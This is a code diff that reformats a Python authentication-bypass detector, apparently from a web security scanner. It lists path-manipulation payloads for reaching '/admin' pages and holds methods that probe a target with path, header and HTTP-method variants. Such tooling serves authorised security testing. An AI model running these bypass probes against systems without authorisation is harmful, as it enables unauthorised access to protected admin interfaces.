@@ -9,20 +9,21 @@
 - 参数污染绕过
 """
 
-import re
-from typing import Dict, List, Any, Optional
-
-import sys
 import os
+import sys
+from typing import Any, Dict, List, Optional
 
 # 导入 requests 用于异常处理
 try:
     import requests
+
     HAS_REQUESTS = True
 except ImportError:
     HAS_REQUESTS = False
 
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))
+sys.path.insert(
+    0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
+)
 
 from tools.detectors.base import BaseDetector, Vulnerability
 
@@ -32,14 +33,31 @@ class AuthBypassDetector(BaseDetector):
 
     # 路径绕过 Payload
     PATH_BYPASS_PAYLOADS = [
-        "/admin", "/admin/", "/admin//", "/admin/./",
-        "/Admin", "/ADMIN", "/administrator",
-        "/admin%20", "/admin%00", "/admin..;/",
-        "/admin;", "/admin.json", "/admin.html",
-        "//admin", "///admin", "/./admin",
-        "/admin?", "/admin#", "/admin%2f",
-        "/admin/..;/admin", "/admin%09", "/admin%0a",
-        "/admin%0d", "/admin/~", "/admin/..",
+        "/admin",
+        "/admin/",
+        "/admin//",
+        "/admin/./",
+        "/Admin",
+        "/ADMIN",
+        "/administrator",
+        "/admin%20",
+        "/admin%00",
+        "/admin..;/",
+        "/admin;",
+        "/admin.json",
+        "/admin.html",
+        "//admin",
+        "///admin",
+        "/./admin",
+        "/admin?",
+        "/admin#",
+        "/admin%2f",
+        "/admin/..;/admin",
+        "/admin%09",
+        "/admin%0a",
+        "/admin%0d",
+        "/admin/~",
+        "/admin/..",
     ]
 
     # 头部绕过 Payload
@@ -65,16 +83,32 @@ class AuthBypassDetector(BaseDetector):
 
     # SPA 误报指示器
     SPA_INDICATORS = [
-        "<!doctype html>", "<div id=\"root\">", "<div id=\"app\">",
-        "react", "vue", "angular", "webpack", "bundle.js",
-        "__NEXT_DATA__", "__NUXT__", "window.__INITIAL_STATE__",
+        "<!doctype html>",
+        '<div id="root">',
+        '<div id="app">',
+        "react",
+        "vue",
+        "angular",
+        "webpack",
+        "bundle.js",
+        "__NEXT_DATA__",
+        "__NUXT__",
+        "window.__INITIAL_STATE__",
     ]
 
     # 真实管理页面指示器
     ADMIN_INDICATORS = [
-        "dashboard", "管理", "admin panel", "control panel",
-        "settings", "configuration", "users", "logout",
-        "welcome admin", "管理员", "后台",
+        "dashboard",
+        "管理",
+        "admin panel",
+        "control panel",
+        "settings",
+        "configuration",
+        "users",
+        "logout",
+        "welcome admin",
+        "管理员",
+        "后台",
     ]
 
     def get_payloads(self) -> Dict[str, List]:
@@ -86,10 +120,7 @@ class AuthBypassDetector(BaseDetector):
         }
 
     def validate_response(
-        self,
-        response: Dict[str, Any],
-        payload: str,
-        baseline: Dict[str, Any] = None
+        self, response: Dict[str, Any], payload: str, baseline: Dict[str, Any] = None
     ) -> bool:
         """验证响应是否表明存在认证绕过"""
         if not response or not response.get("success"):
@@ -155,14 +186,10 @@ class AuthBypassDetector(BaseDetector):
         resp_lower = resp_text.lower()
         return any(indicator in resp_lower for indicator in self.ADMIN_INDICATORS)
 
-    def detect_path_bypass(
-        self,
-        url: str,
-        target_path: str = "/admin"
-    ) -> List[Vulnerability]:
+    def detect_path_bypass(self, url: str, target_path: str = "/admin") -> List[Vulnerability]:
         """检测路径绕过"""
         vulnerabilities = []
-        base_url = url.rstrip('/')
+        base_url = url.rstrip("/")
 
         # 获取基线响应
         baseline = self.get_baseline(base_url + target_path)
@@ -179,7 +206,7 @@ class AuthBypassDetector(BaseDetector):
                     headers={"User-Agent": self.user_agent},
                     timeout=self.timeout,
                     verify=self.verify_ssl,
-                    allow_redirects=False
+                    allow_redirects=False,
                 )
 
                 if resp.status_code != 200:
@@ -195,35 +222,33 @@ class AuthBypassDetector(BaseDetector):
                 has_admin = self._has_admin_content(resp_text)
                 confidence = 0.8 if has_admin else 0.5
 
-                vulnerabilities.append(Vulnerability(
-                    type="Path Bypass",
-                    severity="HIGH" if confidence > 0.7 else "MEDIUM",
-                    url=test_url,
-                    payload=path,
-                    evidence=f"路径绕过成功: {path}",
-                    verified=has_admin,
-                    confidence=confidence,
-                    details={
-                        "path": path,
-                        "status_code": resp.status_code,
-                        "has_admin_content": has_admin,
-                        "response_length": len(resp.text)
-                    }
-                ))
+                vulnerabilities.append(
+                    Vulnerability(
+                        type="Path Bypass",
+                        severity="HIGH" if confidence > 0.7 else "MEDIUM",
+                        url=test_url,
+                        payload=path,
+                        evidence=f"路径绕过成功: {path}",
+                        verified=has_admin,
+                        confidence=confidence,
+                        details={
+                            "path": path,
+                            "status_code": resp.status_code,
+                            "has_admin_content": has_admin,
+                            "response_length": len(resp.text),
+                        },
+                    )
+                )
 
             except (requests.RequestException, OSError) if HAS_REQUESTS else OSError:
                 continue
 
         return vulnerabilities
 
-    def detect_header_bypass(
-        self,
-        url: str,
-        target_path: str = "/admin"
-    ) -> List[Vulnerability]:
+    def detect_header_bypass(self, url: str, target_path: str = "/admin") -> List[Vulnerability]:
         """检测头部绕过"""
         vulnerabilities = []
-        base_url = url.rstrip('/')
+        base_url = url.rstrip("/")
         test_url = base_url + target_path
 
         # 获取基线响应
@@ -240,7 +265,7 @@ class AuthBypassDetector(BaseDetector):
                     headers=full_headers,
                     timeout=self.timeout,
                     verify=self.verify_ssl,
-                    allow_redirects=False
+                    allow_redirects=False,
                 )
 
                 if resp.status_code != 200:
@@ -259,35 +284,33 @@ class AuthBypassDetector(BaseDetector):
                 header_name = list(headers.keys())[0]
                 header_value = list(headers.values())[0]
 
-                vulnerabilities.append(Vulnerability(
-                    type="Header Bypass",
-                    severity="HIGH" if confidence > 0.7 else "MEDIUM",
-                    url=test_url,
-                    payload=f"{header_name}: {header_value}",
-                    evidence=f"头部绕过成功: {header_name}",
-                    verified=has_admin,
-                    confidence=confidence,
-                    details={
-                        "header": headers,
-                        "status_code": resp.status_code,
-                        "has_admin_content": has_admin,
-                        "response_length": len(resp.text)
-                    }
-                ))
+                vulnerabilities.append(
+                    Vulnerability(
+                        type="Header Bypass",
+                        severity="HIGH" if confidence > 0.7 else "MEDIUM",
+                        url=test_url,
+                        payload=f"{header_name}: {header_value}",
+                        evidence=f"头部绕过成功: {header_name}",
+                        verified=has_admin,
+                        confidence=confidence,
+                        details={
+                            "header": headers,
+                            "status_code": resp.status_code,
+                            "has_admin_content": has_admin,
+                            "response_length": len(resp.text),
+                        },
+                    )
+                )
 
             except (requests.RequestException, OSError) if HAS_REQUESTS else OSError:
                 continue
 
         return vulnerabilities
 
-    def detect_method_bypass(
-        self,
-        url: str,
-        target_path: str = "/admin"
-    ) -> List[Vulnerability]:
+    def detect_method_bypass(self, url: str, target_path: str = "/admin") -> List[Vulnerability]:
         """检测 HTTP 方法绕过"""
         vulnerabilities = []
-        base_url = url.rstrip('/')
+        base_url = url.rstrip("/")
         test_url = base_url + target_path
 
         # 获取 GET 基线
@@ -308,26 +331,28 @@ class AuthBypassDetector(BaseDetector):
                     headers={"User-Agent": self.user_agent},
                     timeout=self.timeout,
                     verify=self.verify_ssl,
-                    allow_redirects=False
+                    allow_redirects=False,
                 )
 
                 # 检查是否绕过 (原本 403/401 变成 200)
                 if baseline_status in [401, 403] and resp.status_code == 200:
-                    vulnerabilities.append(Vulnerability(
-                        type="HTTP Method Bypass",
-                        severity="HIGH",
-                        url=test_url,
-                        payload=method,
-                        evidence=f"HTTP 方法绕过: {method} 返回 200 (原 {baseline_status})",
-                        verified=True,
-                        confidence=0.85,
-                        details={
-                            "method": method,
-                            "original_status": baseline_status,
-                            "bypass_status": resp.status_code,
-                            "response_length": len(resp.text)
-                        }
-                    ))
+                    vulnerabilities.append(
+                        Vulnerability(
+                            type="HTTP Method Bypass",
+                            severity="HIGH",
+                            url=test_url,
+                            payload=method,
+                            evidence=f"HTTP 方法绕过: {method} 返回 200 (原 {baseline_status})",
+                            verified=True,
+                            confidence=0.85,
+                            details={
+                                "method": method,
+                                "original_status": baseline_status,
+                                "bypass_status": resp.status_code,
+                                "response_length": len(resp.text),
+                            },
+                        )
+                    )
 
             except (requests.RequestException, OSError) if HAS_REQUESTS else OSError:
                 continue
@@ -335,10 +360,7 @@ class AuthBypassDetector(BaseDetector):
         return vulnerabilities
 
     def detect(
-        self,
-        url: str,
-        param: Optional[str] = None,
-        deep_scan: bool = True
+        self, url: str, param: Optional[str] = None, deep_scan: bool = True
     ) -> Dict[str, Any]:
         """
         认证绕过检测入口
@@ -384,12 +406,14 @@ class AuthBypassDetector(BaseDetector):
                 "header_bypass": sum(1 for v in all_vulnerabilities if "Header" in v.type),
                 "method_bypass": sum(1 for v in all_vulnerabilities if "Method" in v.type),
             },
-            "filtered_spa_fallback": filtered_count
+            "filtered_spa_fallback": filtered_count,
         }
 
 
 # 便捷函数 - 兼容旧接口
-def auth_bypass_detect(url: str, target_path: str = "/admin", deep_scan: bool = True) -> Dict[str, Any]:
+def auth_bypass_detect(
+    url: str, target_path: str = "/admin", deep_scan: bool = True
+) -> Dict[str, Any]:
     """认证绕过检测 (兼容旧接口)"""
     with AuthBypassDetector() as detector:
         return detector.detect(url, param=target_path, deep_scan=deep_scan)
